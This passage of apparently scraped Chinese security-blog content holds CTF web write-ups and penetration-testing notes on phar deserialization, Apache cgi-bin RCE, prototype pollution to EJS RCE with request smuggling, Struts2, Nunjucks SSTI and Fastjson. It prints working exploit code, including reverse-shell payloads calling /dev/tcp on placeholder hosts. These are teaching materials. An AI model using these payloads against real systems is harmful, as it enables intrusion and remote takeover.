fclose($myfile);\n                echo \"上传成功 ./upload/\".$_FILES[\"file\"][\"name\"];\n            }\n        }\n    }else{\n        echo \"dky不喜欢这个文件 .\".$extension;\n    }\n}\n?>\n```\n\n可以看到是上传文件只能是`\"gif\", \"jpeg\", \"jpg\", \"png\"`，然后会对`phar`进行检查，这里其实对`phar`打个`gz`压缩包就可以绕过，然后`phar`协议在读取文件时，发现是`gz`压缩包会自动进行解压读取。\n\n### 2.漏洞利用\n\n首先观察一下给的类\n\n```php\nclass LoveNss{\n    public $ljt;\n    public $dky;\n    public $cmd;\n    public function __construct(){\n        $this->ljt=\"ljt\";\n        $this->dky=\"dky\";\n        phpinfo();\n    }\n    public function __destruct(){\n        if($this->ljt===\"Misc\"&&$this->dky===\"Re\")\n            eval($this->cmd);\n    }\n    public function __wakeup(){\n        $this->ljt=\"Re\";\n        $this->dky=\"Misc\";\n    }\n```\n\n我们传入对应的`ljt`和`dky`即可，但是`__wakeup`会重新赋值，所以需要绕过，尝试使用`CVE-2016-7124`，满足如下条件。虽然这里不知道怎么判断`php`版本，但是可以试试嘛。\n\n```\nPHP5 < 5.6.25\nPHP7 < 7.0.10\n```\n\n那么先使用`phar`序列化\n\n```php\n<?php\nclass LoveNss{\n    public $ljt;\n    public $dky;\n    public $cmd;\n    public function __construct(){\n        $this->ljt=\"Misc\";\n        $this->dky=\"Re\";\n        $this->cmd=\"system('cat /flag');\";\n        //phpinfo();\n    }\n    public function __destruct(){\n        if($this->ljt===\"Misc\"&&$this->dky===\"Re\")\n            eval($this->cmd);\n    }\n    public function __wakeup(){\n        $this->ljt=\"Re\";\n        $this->dky=\"Misc\";\n    }\n}\n\n$phar = new Phar(\"phar.phar\"); //后缀名必须为phar\n$phar->startBuffering();\n$phar->setStub(\"<?php __HALT_COMPILER(); ?>\"); //设置stub\n$o = new LoveNss();\n$phar->setMetadata($o); //将自定义的meta-data存入manifest\n$phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件\n//签名自动计算\n$phar->stopBuffering();\n?>\n```\n\n运行后得到如下文件，序列化字符串在`.metadata.bin`中\n\n![image-20220804152809989](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804152809989.png)\n\n然后需要进行修改，由于存在签名，不能直接修改，需要使用`python`脚本修改\n\n```python\nfrom hashlib import sha1\n#os.system('php exp.php {}'.format(target))\nf1 = open('./phar.phar','rb').read()#phar文件\nfile = f1.replace(b'O:7:\"LoveNss\":3:{s:3:\"ljt\";s:4:\"Misc\";s:3:\"dky\";s:2:\"Re\";s:3:\"cmd\";s:20:\"system(\\'cat /flag\\');\";}',b'O:7:\"LoveNss\":4:{s:3:\"ljt\";s:4:\"Misc\";s:3:\"dky\";s:2:\"Re\";s:3:\"cmd\";s:20:\"system(\\'cat /flag\\');\";}')#修改的内容\ntext = file[:-28]  # 读取开始到末尾除签名外内容\nlast = file[-8:]  # 读取最后8位的GBMB和签名flag\nnew_file = text + sha1(text).digest() + last  # 生成新的文件内容，主要是此时Sha1正确了。\nopen('phar2.phar', \"wb\").write(new_file)\n```\n\n我们需要修改的就是替换的内容和生成的文件名字即可，运行之后得到如下文件，已经被改变了。\n\n![image-20220804153113690](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804153113690.png)\n\n之后用`gzip ./phar2.phar`打个压缩包，然后改个后缀名为`jpg`即可上传。\n\n然后使用`burpsuite`使用`phar`协议访问即可，如下得到`flag`\n\n![image-20220804153914770](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804153914770.png)\n\n## 二、ez_rce\n\n打开靶机啥也没有，`dirsearch`扫一波。\n\n![image-20220804154756848](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804154756848.png)\n\n有`/cgi-bin/`，而且名字`rce`，猜测`apache`的`cgi-bin`漏洞\n\n[Apache49-50任意文件读取与RCE整理 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/419976985)\n\n直接`payload`\n\n```\n POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1\n echo;whoami;ida\n```\n\n发现可以，那么直接`ls /`，查看启动脚本`run.sh`\n\n![image-20220804155731252](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804155731252.png)\n\n直接`cat`得到`flag`\n\n![image-20220804155807904](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804155807904.png)\n\n\n\n# SECCONCTF2022\n\n## 一、skipinx\n\n### 1.源代码分析：\n\n在`index.js`中可以看到\n\n```js\nconst app = require(\"express\")();\n\nconst FLAG = process.env.FLAG ?? \"SECCON{dummy}\";\nconst PORT = 3000;\n\napp.get(\"/\", (req, res) => {\n  req.query.proxy.includes(\"nginx\")\n    ? res.status(400).sesnd(\"Access here directly, not via nginx :(\")\n    : res.send(`Congratz! You got a flag: ${FLAG}`);\n});\n\napp.listen({ port: PORT, host: \"0.0.0.0\" }, () => {\n  console.log(`Server listening at ${PORT}`);\n});\n\n```\n\n如果`req.query.proxy`这个列表中不包含`nginx`即输出`flag`\n\n然后再看`nginx`的配置`default.conf`\n\n```json\nserver {\n  listen 8080 default_server;\n  server_name nginx;\n\n  location / {\n    set $args \"${args}&proxy=nginx\";\n    proxy_pass http://web:3000;\n  }\n}\n```\n\n可以看到会默认给传入的`$args`进行拼接`proxy=nginx`，那么这样在`proxy`中就必定含有`nginx`\n\n### 2.漏洞分析\n\n源代码中调用的库为JS的标准库`req.query.proxy.includes(\"nginx\")`，其`query`下的参数个数默认配置为1000，如果超过，就只会解析前1000个参数，在如下仓库：[qs/dist at main · ljharb/qs (github.com)](https://github.com/ljharb/qs/tree/main/dist)\n\n![image-20221114194250871](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221114194250871.png)\n\n所以我们可以这样写，当`proxy`的个数超过1000就会导致`index.js`代码中的拼接的`proxy=nginx`无法解析到，成功完成`proxy`的覆盖\n\n```\nurl/?proxy=a&proxy=a&proxy=a&proxy=a&proxy=a...\n```\n\n但是`proxy`的个数也不能太多，太多的话会导致`url`太长，出现如下情况，这个是由于`nginx`的限制\n\n![image-20221114214652469](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221114214652469.png)\n\n那么我们改改即可\n\n```\nurl/?proxy=a&m=a&m=a&m=a&m=a...&m=a...\n```\n\n这样就会使得参数超过1000个但是`url`长度也不会太长。\n\n\n\n\n\n# 西湖论剑2023\n\n## real_ez_node\n\n### 原型链污染漏洞\n\n`./src/routes/index.js`中\n\n首先在`copy`路径中，由于`safeobj.expand`存在原型链污染漏洞\n\n```js\nrouter.post('/copy',(req,res)=>{\n    var ip = req.connection.remoteAddress;\n    if (!ip.includes('127.0.0.1')) return;\n    let user = {};\n    for (let index in req.body)\n        if(!index.includes(\"__proto__\"))\n            safeobj.expand(user, index, req.body[index]);\n    //.....\n})\n```\n\n参考：[深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html?page=1#reply-list)\n\n该函数`expand`代码如下\n\n```js\nexpand: function (obj, path, thing) {\n    if (!path || typeof thing === 'undefined') {\n        return;\n    }\n    obj = isObject(obj) && obj !== null ? obj : {};\n    var props = path.split('.');\n    if (props.length === 1) {\n        obj[props.shift()] = thing;//从左数取第一个\n    } else {\n        var prop = props.shift();\n        if (!(prop in obj)) {\n            obj[prop] = {};\n        }\n        _safe.expand(obj[prop], props.join('.'), thing);\n    }\n}\n```\n\n通过如下代码简单调试一下\n\n参考：[关于Prototype Pollution Attack的二三事 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/12053)\n\n```js\nvar safeObj = require(\"safe-obj\");\nvar obj = {};\nconsole.log(\"Before : \" + {}.polluted);\nsafeObj.expand(obj, '__proto__.polluted', 'Yes! Its Polluted');\nconsole.log(\"After : \" + {}.polluted);\n```\n\n结果如下\n\n![image-20230204164445320](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230204164445320.png)\n\n即可知道，该函数的作用就是将`obj.path`赋值为`thing`，使用的是递归方式进行相关属性的寻找赋值。\n\n那么就可以通过该函数，给基类`object`添加某个属性，或者修改某个属性，从而造成所有的对象相关的属性都会被修改掉。\n\n而对于题目中的`req.body[index]`，这个就是我们包的`POST`的数据，是可控的。\n\n### 配合`ejs`进行`RCE`\n\n在`./src/app.js`中用到了`ejs`进行模板渲染\n\n![image-20230204165526170](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230204165526170.png)\n\n对于`ejs`进行渲染时，调用的是`compile `方法，结合原型链污染漏洞，可以造成`RCE`，可参考：[从 Lodash 原型链污染到模板 RCE-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/248170#h3-1)\n\n即污染掉`compile`方法中的`opts.outputFunctionName`，那么在渲染时，就会将污染之后的字符串和`prepended`进行拼接，在之后渲染的时候就能够执行到污染的字符串中的`js`代码，完成`RCE`的利用。\n\n![image-20230204165929533](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230204165929533.png)\n\n常见`POC`\n\n```js\n{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require(\\'child_process\\').execSync('calc');var __tmp2\"}}\n\n{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require(\\'child_process\\').exec('calc');var __tmp2\"}}\n\n{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/xxx/6666 0>&1\\\"');var __tmp2\"}}\n```\n\n### SSRF的利用\n\n在前面的`copy`方法中有个`ip`检测\n\n```js\nif (!ip.includes('127.0.0.1')) return;\n```\n\n需要绕过这个检测才能进行原型链污染的漏洞利用，这里就用到了在某些`nodejs`版本下的`http.get()`这个方法的利用了。题目是`8.1.2`，可以自己用下述代码进行测试某些版本能不能用\n\n```js\nvar express = require('express');\nvar http = require('http');\nvar app = express();\n\napp.post('/test',(req,res)=>{\n    console.log('get test');\n})\n\napp.get('/curl', function(req, res) {\n    var q = req.query.q;\n    if (q) {\n        var url = 'http://127.0.0.1:12345/?q=' + q;\n        http.get(url);\n    }\n})\n\nvar server = app.listen(12345, function () {\n\n    var host = server.address().address\n    var port = server.address().port\n\n    console.log(\"应用实例，访问地址为 http://%s:%s\", host, port)\n\n})\nmodule.exports = app;\n```\n\n参考：[nodejs请求走私与ssrf | blog (le31ei.top)](https://blog.le31ei.top/2021/05/23/nodejs请求走私与ssrf/)\n\n这个方法利用的原理就是`Unicode`转换的关系，详情见：[通过拆分攻击实现的SSRF攻击 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/2894)\n\n可以看到在`curl`路径中，使用到了`http.get()`\n\n```js\n//./src/routes/index.js\nrouter.get('/curl', function(req, res) {\n    var q = req.query.q;\n    var url = 'http://localhost:3000/?q=' + q\n    try {\n        http.get(url,(res1)=>{ \n    // ......\n```\n\n那么使用脚本构造下走私的`Http`包即可，该脚本是战队里学弟写的\n\n```python\nimport requests\nfrom urllib.parse import quote\ndata = \"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/IP/PORT 0>&1\\\"');var __tmp2\"\ndata = f\"constructor.prototype.outputFunctionName={quote(data)}\"\nreq = \"1 HTTP/1.1\\r\\n\\r\\n\"\nreq += \"POST /copy HTTP/1.1\\r\\n\"\nreq += \"Content-Type: application/x-www-form-urlencoded\\r\\n\"\nreq += f\"Content-Length: {len(data)}\\r\\n\"\nreq += f\"\\r\\n{data}\\r\\n\\r\\n\"\nreq = req.replace(' ', '\\u0120').replace('\\r', '\\u010d').replace('\\n', '\\u010a')\nprint(quote(req))\n```\n\n设置一下`IP/PORT`即可反弹`Shell`\n\n需要注意的是，这个`SSRF`走私的数据包只能在内网中用，不能添加比如说`Host:`字段来出网。\n\n\n\n# *CTF2023\n\n## jwt2struts\n\n访问之后给提示\n\n![image-20230729180147150](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180147150.png)\n\n接着访问\n\n![image-20230729180206893](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180206893.png)\n\n### 1.hash扩展长度攻击\n\n属于是hash扩展长度攻击了，参考：https://blog.csdn.net/LYJ20010728/article/details/116779357\n\n具体步骤如下\n\n![image-20230729180433572](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180433572.png)\n\n发送POST包如下\n\n![image-20230729180513310](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180513310.png)\n\n得到key为sk-he00lctf3r\n\n结合最开始访问的提示，包括题目名称\n\n![image-20230729180551778](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180551778.png)\n\n应该是需要修改JWT令牌为admin，最开始访问网站抓包可以看到默认会给user的JWT令牌，那么现在有key，就可以生成admin的JWT令牌\n\n![image-20230729180733485](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180733485.png)\n\n### 2.JWT令牌\n\n按照如下步骤可对user的JWT令牌进行验证\n\n[如何使用在线工具手动验证JWT签名 - 曾昊 - 博客园 (cnblogs.com)](https://www.cnblogs.com/zengjindong/p/14286529.html)\n\n[(64条消息) 全栈之初识JWT -- Web安全的守护神_eyj0exaioijkv1qilcjhbgcioijiuzi1nij9.eyjyzwdpc_张兴华(MarsXH.Chang)的博客-CSDN博客](https://blog.csdn.net/q95548854/article/details/103907825)\n\n提取user的JWT令牌，用cyberchef的base64查看即可\n\n![image-20230729181008635](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181008635.png)\n\n![image-20230729181027419](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181027419.png)\n\n然后将user改为admin，base64得到JWT令牌的头部和载荷\n\n![image-20230729181229611](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181229611.png)\n\n![image-20230729181300249](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181300249.png)\n\n去掉其中的\"=\"号，然后依据头部(header).载荷(payload)的顺序准备进行加密，网站为[Modular conversion, encoding and encryption online - cryptii](https://cryptii.com/)\n\n![image-20230729181602274](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181602274.png)\n\n将得到的最终结果放入access_token中发送\n\n![image-20230729181807831](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181807831.png)\n\n返回了一个Location，访问如下\n\n![image-20230729182035159](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729182035159.png)\n\n### 3.struts2框架漏洞\n\n结合题目提示，应该是struts2漏洞，依据如下网址挨个尝试POC\n\n[(64条消息) 【渗透测试】Struts2系列漏洞_struts2漏洞_离陌lm的博客-CSDN博客](https://blog.csdn.net/weixin_53972936/article/details/127590995)\n\n其中**S2-005**漏洞可以成功，成功执行命令，POC为\n\n```\n' + (#_memberAccess[\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ls').getInputStream())) + '\n```\n\n其中ls即可随意更改执行命令，右键查看源代码即可看到返回的结果\n\n![image-20230729182336645](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729182336645.png)\n\n输入命令env即可得到flag\n\n![image-20230729182410190](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729182410190.png)\n\n# DeconstruCTF\n\n## gitcha\n\ndirsearch发现有.git，泄露之后发现源码，审计代码，设置Cookie\n\n![image-20230806193032520](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230806193032520.png)\n\n可以通过document.进行设置\n\n```\ndocument.cookie=”SECRET_COOKIE_VALUE=thisisahugesecret″;=\n```\n\n然后显示note信息的函数中存在nunjucks模板注入，也可以通过输入框输入\n\n```\n{{7+7}}\n```\n\n来进行测试，如果返回结果14，则存在模板注入\n\n[从一道题目学习Nunjucks模板 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/12264)\n\n![image-20230806193102087](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230806193102087.png)\n\n如下payload执行代码，cat flag\n\n```\n{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat flag').toString()\")()}}\n```\n\n## why-are-types-weird\n\n写一半，dirsearch之后显示源码\n\n```php\n<?php\nif (isset($_GET['but_submit'])) {\n    $username = $_GET['txt_uname'];\n    $password = $_GET['txt_pwd'];\n    if ($username !== \"admin\") {\n        echo \"Invalid username\";\n    } else if (hash('sha1', $password) == \"0\") {\n        session_start();\n        $_SESSION['username'] = $username;\n        header(\"Location: admin.php\");\n    } else {\n        echo \"Invalid password\";\n    }\n}\n```\n\n存在\"0\"的弱比较，参考：\n\n[spaze/hashes: Magic hashes – PHP hash \"collisions\" (github.com)](https://github.com/spaze/hashes)\n\n![image-20230806194845949](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230806194845949.png)\n\n其中提供sha1的弱比较sha字符串，即可登录。\n\n\n\n\n\n# WEB小技巧\n\nImagefile?url1=file:///%25%36%36%25%36%63%25%36%31%25%36%37%23java\n\n\n\n/admin/..//..//..//..//..//..//..//flag\n","tags":["比赛"],"categories":["WEB","比赛题目"]},{"title":"渗透测试","url":"/2022/08/14/渗透/","content":"\n\n\n# 前置知识\n\n## 一、信息搜集\n\n###  1.子域名\n\n- google hacking\n\n  ```\n  site:baidu.com\n  inurl:php?id=1\n  ```\n\n- 三方网站查询\n\n  ```\n  https://dnsdumpster.com\n  http://tool.chinaz.com/subdomain\n  FOFA\n  ```\n\n- SSL证书查询\n\n  ```\n  https://crt.sh/\n  ```\n\n- JS文件发现子域名\n\n  安装一下，可以使用，原理就是网站源代码下保存的各种子域名\n\n  ```\n  https://github.com/Threezh1/JSFinder\n  ```\n\n- 子域名爆破工具：......\n\n  或者在线工具\n\n  ```\n  https://github.com/lijiejie/subDomainsBrute\n  ```\n\n- **OneForAll**：安装使用，设置API很好用\n\n  ```\n  https://github.com/shmilylty/OneForAll\n  ```\n\n### 2.IP搜集\n\n有的服务开启了CDN之后，真实的服务器在北京，可是福建也存在它的服务备份，所以当我们从福建进行域名访问时，其访问到的IP就可能是在福建的IP，而不是其在北京的真实服务区的IP。所以有的时候需要绕过。\n\n- 多地Ping\n\n  挑选最多的IP从而判断真实IP\n\n  ```\n  http://ping.chinaz.com\n  http://www.webkaka.com/Ping.aspx\n  ```\n\n- 国外服务区Ping\n\n  CDN由于昂贵，一般不对国外的服务提供CDN服务，所以使用国外服务区进行Ping一般可以找到真实IP。\n\n- 查看子域名的IP，通过Ping子域名查看\n\n- 查询历史DNS记录\n\n  由于最开始建设网站没有CDN的时候域名对应真实IP，所以拿到最开始那一段时间的可以看到真实IP\n\n  ```\n  https://dnsdb.io/zh-cn\n  https://securitytrails.com\n  https://x.threatbook.cn/\n  ```\n\n### 3.C段存活主机探测\n\n- nmap工具\n\n  ```\n  nmap -sP www.xxx.com/24\n  nmap -sP 192.168.1.*\n  ```\n\n- 其他工具：\n\n  ```\n  https://github.com/se55i0n/Cwebscanner\n  ```\n\n- 常用命令\n\n  ```bash\n  nmap -sn -v -T4 -oG Discover.gnmap 172.26.1.0/24     #主机探测\n  grep \"Status: Up\" Discover.gnmap | cut -f 2 -d '' > LiveHosts.txt\n  \n  #端口扫描\n  nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt\n  \n  #系统扫描\n  nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt\n  \n  #版本检测\n  nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt\n  ```\n\n### 4.其他信息搜集\n\n- 历史漏洞信息\n\n  ```\n  http://wy.zone.ci/\n  https://wooyun.kieran.top/#!/\n  \n  https://www.exploit-db.com/ \t#漏洞查找\n  \n  https://wiki.0-sec.org/#/md\n  \n  https://www.seebug.org/\n  ```\n\n  \n\n## 二、网站信息搜集\n\n### 1.网站指纹识别\n\n- 操作系统\n\n  - ping：\n\n    windows的TTL值一般为128，Linux则为64。TTL大于100一般为windows，几十一般为linux。\n\n  - nmap -O扫描\n\n  - windows大小写不敏感，Linux则很区分大小写\n\n- 中间件\n\n  - F12响应头Server字段\n\n  - whatweb：\n\n    ```\n    https://www.whatweb.net/\n    ```\n\n  - wappalyzer浏览器插件\n\n- 语言识别\n\n  - PHP、ASP等等\n  - 数据库类型等\n\n- CMS识别：\n\n  内容管理系统，用于网站内容文章管理，常见有dedecms、Discuz、phpcms等\n\n  - 识别工具：\n\n    ```\n    http://whatweb.bugscaner.com/look/\n    https://github.com/iceyhexman/onlinetools\n    ```\n\n### 2.敏感文件、目录探测\n\n常见有\n\n```\ngithub \t\t\t#直接github上搜索该网站\n.git\t\t\t#GitHack自动化利用,原理是本地和远程相互备份了\n.svn\n.DS_Store  #苹果操作系统的文件\n.hg\n.bzr\ncvs\n\nWEB-INF\t\t\t\n#是JAVA的WEB应用的安全目录,如果想要在页面中直接访问其中的文件,必须要通过web.xml文件对要访问的文件进行相应的映射才能访问。\n\nwww.zip\n```\n\n- 工具\n\n  ```\n  dirsearch\n  御剑\n  https://github.com/H4ckForJob/dirmap\n  ```\n\n- 针对漏洞的信息泄露\n\n  ```\n  https://github.com/LandGrey/SpringBootVulExploit\n  https://github.com/rabbitmask/SB-Actuator\n  ```\n\n\n\n### 3.网站WAF识别\n\n```\nhttps://github.com/EnableSecurity/wafw00f\nnmap -p80,443 --script http-waf-detect ip\nnmap -p80,443 --script http-waf-fingerprint ip\n```\n\n\n\n## 三、漏洞扫描\n\n### 1.针对性漏洞\n\n- SQL：sqlmap\n- weblogic：weblogicscan\n\n- CMS\n  - wordpress：wpscan\n  - dedecms：dedecmsscan\n\n- 应用层：nessus\n\n- 某类框架：Struts2(Struts2漏洞检测工具)、sprintboot(SB-Actuator)\n- web服务：xray、awvs\n\n### 2.awvs\n\n![image-20221113110028639](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221113110028639.png)\n\n## 四、常见漏洞\n\n### 1.weblogic\n\n- 端口：7001\n\n- Web界面特征：\n\n  ![image-20221113111840633](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221113111840633.png)\n\n### 2.Thinkphp5\n\n```\nhttps://github.com/admintony/thinkPHPBatchPoc\n```\n\n### 3.Struts2\n\n- 框架识别：\n  - `.do`或者`.action`后缀\n  - `/struts/webconsole.html`界面：需要开启`devMode`\n\n- 工具：\n\n  ```\n  https://github.com/HatBoy/Struts2-Scan\n  ```\n\n- 常见漏洞：\n\n  - struts2-045：CVE-2017-5638，可代码执行，版本在2.3.5~2.3.31和2.5~2.5.10\n\n    在使用基于Jakarta插件的文件上传功能时，可能存在远程命令执行。\n\n    https://www.anquanke.com/post/id/85674\n\n### 4.Jboss\n\nJAVA EE应用服务器，通常与Tomcat或jetty绑定使用\n\n- 框架识别：\n\n  - 8080端口：6...版本\n\n    ![image-20221113115127399](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221113115127399.png)\n\n  - 1741端口：7...版本\n\n- 工具：\n\n  ```\n  https://github.com/GGyao/jbossScan\n  ```\n\n- 常见漏洞：\n\n  - CVE-2017-12149\n\n    JAVA反序列化错误，在过滤器没有进行检查。\n\n    访问`/invoker/readonly`显示500可能存在\n\n    ![image-20221113115659179](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221113115659179.png)\n\n    可使用如下工具进行反弹shell\n\n    ```\n    https://github.com/joaomatosf/jexboss\n    ```\n\n### 5.Fastjson\n\n- 识别：\n  - 出现json格式的地方就又可能使用了fastjson（`Content-type:application/json`）\n\n- 原理：\n\n  在`FastJson` 中有一个`@type` 参数，能将我们反序列化后的类转为`@type` 中指定的类，然后在反序列化过程中会自动调用类中的`setter`， `getter` 和构造器，参考：[FastJason 1.2.22-1.2.24 TemplatesImpl利用链分析 (yuque.com)](https://www.yuque.com/tianxiadamutou/zcfd4v/rwx6sb)\n\n  使用`springboot`时如下\n\n  ```java\n  @RequestMapping(\"/fast\")\n  public String FastVuln1(@RequestParam(name=\"evil\") String evil) throws Exception{\n      Object obj = JSON.parseObject(evil,Object.class, Feature.SupportNonPublicField);\n      System.out.println(obj.getClass().getName());\n      return evil;\n  }\n  ```\n\n  相关`Evil`类\n\n  ```java\n  package com.example.fastjsondemo;\n  \n  public class Evil {\n      public String cmd;\n  \n      public Evil(){\n  \n      }\n  \n      public void setCmd(String cmd) throws Exception{\n          this.cmd = cmd;\n          Runtime.getRuntime().exec(this.cmd);\n      }\n  \n      public String getCmd(){\n          return this.cmd;\n      }\n  \n      @Override\n      public String toString() {\n          return \"Evil{\" +\n                  \"cmd='\" + cmd + '\\'' +\n                  '}';\n      }\n  }\n  ```\n\n  对应的`payload`为，记得`url`编码一下\n\n  ```\n  http://127.0.0.1:8080/fast?evil={\"@type\":\"com.example.fastjsondemo.Evil\",\"cmd\":\"touch ccc\"}\n  ```\n\n  或者利用一下`dnslog`\n\n  ```\n  http://127.0.0.1:8080/fast?evil={\"@type\":\"java.net.InetAddress\",\"val\":\"je85rk.dnslog.cn\"}\n  ```\n\n  结合`JAVA`反序列化的知识，得到`POC`\n\n  ```java\n  package com.example.fastjsondemo;\n  \n  import com.alibaba.fastjson.JSON;\n  import com.alibaba.fastjson.parser.Feature;\n  import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\n  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\n  import javassist.*;\n  \n  import javax.xml.transform.Templates;\n  import javax.xml.transform.Transformer;\n  import javax.xml.transform.TransformerConfigurationException;\n  import java.time.temporal.Temporal;\n  import java.util.Base64;\n  import java.util.HashMap;\n  import java.util.Properties;\n  \n  public class poc {\n      public static String generateEvil() throws Exception {\n          ClassPool pool = ClassPool.getDefault();\n          CtClass clas = pool.makeClass(\"test\");\n          pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));\n          String cmd = \"Runtime.getRuntime().exec(\\\"touch dddd\\\");\";\n          clas.makeClassInitializer().insertBefore(cmd);\n          clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));\n  \n          clas.writeFile(\"./\");\n  \n          byte[] bytes = clas.toBytecode();\n          String EvilCode = Base64.getEncoder().encodeToString(bytes);\n          //System.out.println(EvilCode);\n          return EvilCode;\n      }\n      public static void main(String[] args) throws Exception {\n          final String GADGAT_CLASS = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\";\n          String evil = poc.generateEvil();\n          String PoC = \"{\\\"@type\\\":\\\"\" + GADGAT_CLASS + \"\\\",\\\"_bytecodes\\\":[\\\"\" + evil + \"\\\"],'_name':'a.b','_tfactory':{},\\\"_outputProperties\\\":{ },\" + \"\\\"_name\\\":\\\"a\\\",\\\"allowedProtocols\\\":\\\"all\\\"}\\n\";\n          System.out.println(PoC);\n          JSON.parseObject(PoC,Object.class, Feature.SupportNonPublicField);\n      }\n  }\n  ```\n\n  \n\n### 6.shiro\n\n环境搭建：[(47条消息) shiro debug 调试_scanner010的博客-CSDN博客](https://blog.csdn.net/m0_46127592/article/details/123999749)\n\n其它参考：[Shiro 550 漏洞学习（一） (yuque.com)](https://www.yuque.com/tianxiadamutou/zcfd4v/op3c7v#e9db1d2a)\n\n[P神知识星球的TemplatesImpl在Shiro中的利用](https://wx.zsxq.com/dweb2/index/topic_detail/582525812214224)\n\n- `Shiro-550`原理：\n\n  `1.2.4`及以下\n\n  `Apache Shiro`框架提供了记住密码功能，登录成功的化会生成经过加密并且编码的`Cookie`，实际为`rememberMe`。那么在服务端就会对该`Cookie`进行`base64`解码，然后`AES`解密，最后再反序列化，这样就会导致反序列化的`RCE`漏洞，而其中`AES`加解密的`KEY`是硬编码写在源码中的。\n\n  修复即去掉了默认的`key`\n\n- `Shiro-721`原理：\n\n  同样也是`rememberMe`字段，不过需要一个合法的`rememberMe`字段作为前缀\n\n- 识别：\n\n  - `Remember Me`的功能\n  - 抓包的时候在`set-cookie`中有`remeberMe`字段\n  - 或者`key`不同导致的信息回传\n\n- 检测：\n\n  ```\n  https://github.com/search?q=shiroscan\n  ```\n\n- 利用：\n\n  很多种类，用`ysoserial`吧，需要去掉`JSESSIONID`字段，具体的可以看看`vulhub`中讲到的方法。\n\n▲注：\n\n自己本地调试`shiro-550`的时候，老是没办法反序列化，执行到反序列化时，即最终的`DefaultSerializer.java  -  deserialize`函数中就会抛出异常，直接跳转到异常处理去，应该是环境搭建有点问题。\n\n![image-20221118112528568](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221118112528568.png)\n\n### 7.Redis\n\n- 端口：6379\n\n\n\n\n\n# TIPS\n\n## 1.目录穿越\n\n`../`约等于`{.}`\n","tags":["渗透测试"],"categories":["WEB","渗透测试"]},{"title":"JAVA反序列化CC链笔记","url":"/2022/07/25/JAVA反序列化CC/","content":"\n# 前置说明\n\n依据这张图来进行一些分析\n\n参考：[Commons-Collections 1-7 利用链分析 – 天下大木头 (wjlshare.com)](http://wjlshare.com/archives/1535)\n\n![DF8C7E9CED07CAD7321EFED262F23E20](https://pig-007.oss-cn-beijing.aliyuncs.com/img/DF8C7E9CED07CAD7321EFED262F23E20.png)\n\n# 前置知识\n\nCC链包含了好多的`Transformer`，这部分知识在`P`神的[JAVA安全漫谈](https://github.com/phith0n/JavaThings)中讲的挺清楚的[Java安全漫谈 - 09.反序列化篇(3)](https://wx.zsxq.com/dweb2/index/topic_detail/548841448822424)，简单提一下\n\n## 源码-8u40\n\n## Transformer\n\n`Transformer`是⼀个接⼝，代表调用该对象的`transform`方法\n\n```java\npublic interface Transformer {\n    Object transform(Object input);\n}\n```\n\n很多的`transformer`系列对象都实现了该接口，并且进行重写，比如熟悉的像`InvokerTransformer`\n\n```java\npublic class 